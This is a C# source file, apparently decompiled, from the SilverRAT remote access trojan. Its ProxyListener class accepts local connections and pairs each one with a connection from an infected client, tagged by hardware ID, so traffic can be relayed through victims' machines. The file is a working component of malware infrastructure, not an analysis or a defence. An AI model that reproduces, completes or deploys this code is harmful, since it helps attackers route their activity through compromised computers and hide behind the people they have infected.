using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Helper.ReverseProxy;

public class ProxyListener
{
    private readonly TcpListener TcpListener_0;

    private bool IsConnected = true;

    public TcpClient TcpClient_0 { get; set; }

    public TcpClient TcpClient_1 { get; set; }

    public string RemoteIP { get; set; }

    public string HWID { get; set; }

    public int IndexClient { get; set; }

    public ProxyListener(int localport, string remoteIP, string key, int ownerIndex)
    {
        try
        {
            HWID = key;
            TcpListener_0 = new TcpListener(IPAddress.Any, localport);
            TcpListener_0.Start(20);
            RemoteIP = remoteIP;
            IndexClient = ownerIndex;
            new Thread(AcceptTcpClient).Start();
        }
        catch (Exception ex)
        {
            MessageBox.Show("ERR start: " + ex.ToString());
            StopServer();
        }
    }

    private void AcceptTcpClient()
    {
        try
        {
            while (IsConnected)
            {
                TcpClient tcpClient_ = TcpListener_0.AcceptTcpClient();
                while (Settings.IsConnectedProxy)
                {
                    if (TcpClient_0 == null)
                    {
                        Thread.Sleep(100);
                        continue;
                    }
                    TcpClient tcpClient_2 = TcpClient_0;
                    TcpClient_0 = null;
                    new ProxyClient().NetworkStream(tcpClient_, tcpClient_2);
                    TcpClient_1 = tcpClient_2;
                    Thread.Sleep(100);
                    break;
                }
            }
        }
        catch
        {
        }
    }

    public void StopServer()
    {
        try
        {
            TcpListener_0.Stop();
            IsConnected = false;
        }
        catch (Exception ex)
        {
            MessageBox.Show("ERR stop : " + ex.ToString());
        }
    }
}
